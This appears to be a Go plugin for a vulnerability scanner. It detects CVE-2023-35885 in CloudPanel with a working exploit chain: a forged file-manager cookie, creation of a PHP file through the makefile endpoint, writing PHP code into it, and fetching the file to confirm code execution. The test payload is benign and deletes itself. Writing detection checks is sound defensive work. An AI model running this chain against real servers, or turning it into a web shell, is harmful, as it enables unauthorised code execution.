package goplugin

import (
	"Yscanner/utils"
	"bytes"
	"fmt"
	"net/http"
	"strings"
)

func init() {
	Register("cloudpanel_rce_cve_2023_35885", &cloudpanel_rce_cve_2023_35885{})
}

type cloudpanel_rce_cve_2023_35885 struct{}

func (p *cloudpanel_rce_cve_2023_35885) Info() PluginInfo {
	return PluginInfo{
		Name:     "CloudPanel makefile接口远程命令执行漏洞",
		VulnInfo: "CloudPanel是开源的一款免费软件。用于配置和管理服务器。CloudPanel 2.3.1之前版本存在安全漏洞，该漏洞源于具有不安全的文件管理器cookie身份验证。",
		VulnID:   "CVE-2023-35885",
		Level:    "9.8 CRITICAL",
		URL:      "",
		Version:  "2.0.0 <= version <= 2.3.1",
		CWE:      "CWE-565	在信任Cookie未进行验证与完整性检查",
	}
}

func (p *cloudpanel_rce_cve_2023_35885) Check(netloc string) bool {
	rand_str := utils.GenRandom(10)
	payload := fmt.Sprintf("id=/htdocs/app/files/public/&name=%s.php", rand_str)

	req_make_file, err := http.NewRequest("POST", netloc+"/file-manager/backend/makefile", bytes.NewBufferString(payload))
	if err != nil {
		return false
	}
	req_make_file.Header.Set("Cookie", "clp-fm=ZGVmNTAyMDA5NjM3ZTZiYTlmNzQ3MDU1YTNhZGVlM2IxODczMTBjYjYwOTFiNDRmNmZjYTFjZjRiNmFhMTEwOTRiMmNiNTA5Zjc2YjY1ZGRkOWIwMGZmNjE2YWUzOTFiOTM5MDg0Y2U5YzBlMmM5ZTJlNGI3ZTM3NzQ1OTk2MjAxNTliOWUxYjE1ZWVlODYxNGVmOWVkZDVjMjFmYWZkYjczZDFhNGZhOGMyMmQyMmViMGM2YTkwYTE4ZDEzOTdkMmI4YWMwZmI0YWYyNTRmMjUzOTJlNzNiMGM4OWJmZTU0ZDA1NTIwYTJmMjI0MmM2NmQyOWJjNzJlZGExODA0NzBkZmU3YTRkYTM=")
	req_make_file.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp_make_file, err := utils.RequestDo(req_make_file, true, 2)
	if err != nil {
		return false
	}

	if resp_make_file.Other.StatusCode == 200 && strings.Contains(resp_make_file.ResponseRaw, rand_str) {
		rand_str2 := utils.GenRandom(10)
		payload2 := fmt.Sprintf("id=/htdocs/app/files/public/%s.php&content=<?php echo '%s';unlink(__FILE__)?>", rand_str, rand_str2)

		req_write_info, err := http.NewRequest("POST", netloc+"/file-manager/backend/text", bytes.NewBufferString(payload2))
		if err != nil {
			return false
		}
		req_write_info.Header.Set("Cookie", "clp-fm=ZGVmNTAyMDA5NjM3ZTZiYTlmNzQ3MDU1YTNhZGVlM2IxODczMTBjYjYwOTFiNDRmNmZjYTFjZjRiNmFhMTEwOTRiMmNiNTA5Zjc2YjY1ZGRkOWIwMGZmNjE2YWUzOTFiOTM5MDg0Y2U5YzBlMmM5ZTJlNGI3ZTM3NzQ1OTk2MjAxNTliOWUxYjE1ZWVlODYxNGVmOWVkZDVjMjFmYWZkYjczZDFhNGZhOGMyMmQyMmViMGM2YTkwYTE4ZDEzOTdkMmI4YWMwZmI0YWYyNTRmMjUzOTJlNzNiMGM4OWJmZTU0ZDA1NTIwYTJmMjI0MmM2NmQyOWJjNzJlZGExODA0NzBkZmU3YTRkYTM=")
		req_write_info.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp_write_info, err := utils.RequestDo(req_write_info, true, 2)
		if err != nil {
			return false
		}

		if resp_write_info.Other.StatusCode == 200 && strings.Contains(resp_write_info.ResponseRaw, rand_str) {
			req_check, err := http.NewRequest("GET", netloc+"/"+rand_str+".php", nil)
			if err != nil {
				return false
			}
			resp_check, err := utils.RequestDo(req_check, true, 2)
			if err != nil {
				return false
			}
			if resp_check.Other.StatusCode == 200 && strings.Contains(resp_check.ResponseRaw, rand_str2) {
				return true
			}
		}
	}

	return false
}
